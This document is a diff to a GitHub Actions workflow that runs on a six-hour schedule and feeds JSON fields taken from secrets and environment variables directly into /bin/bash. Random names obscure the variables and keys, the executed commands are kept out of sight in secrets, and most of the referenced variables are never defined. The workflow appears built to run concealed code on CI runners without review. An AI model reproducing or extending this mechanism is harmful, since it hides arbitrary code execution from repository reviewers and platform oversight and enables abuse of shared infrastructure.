@@ -3,21 +3,25 @@ name: nanquep
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 4/6 * * *'
+    - cron: '37 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: nanquep
         env:
-          gn3061: ${{ secrets.gn3061 }}
+          r42: ${{ secrets.r42 }}
         run: |
-          echo $gn3061 | jq -r .znuky161 | /bin/bash
-          echo $qsrue96 | jq -r .kbli22223 | /bin/bash
-          echo $djjm731 | jq -r .kyy5 | /bin/bash
-          echo $l416 | jq -r .p3204 | /bin/bash
-          echo $ppg64672 | jq -r .eypf3 | /bin/bash
-          echo $dywg62 | jq -r .pdzz46360 | /bin/bash
+          echo $r42 | jq -r .gjpx913 | /bin/bash
+          echo $uecwz114 | jq -r .mwo60 | /bin/bash
+          echo $leswh467 | jq -r .jxkep3 | /bin/bash
+          echo $oq95 | jq -r .vvjm7913 | /bin/bash
+          echo $tjyh74403 | jq -r .gah2 | /bin/bash
+          echo $hqe145 | jq -r .t9712 | /bin/bash
+          echo $uxvop9630 | jq -r .bqoit895 | /bin/bash
+          echo $r645 | jq -r .fsna71 | /bin/bash
+          echo $lzd3919 | jq -r .x9320 | /bin/bash
+          echo $efqt12972 | jq -r .mwc0202 | /bin/bash
+          echo $ihaes625 | jq -r .vpdqc67694 | /bin/bash
 
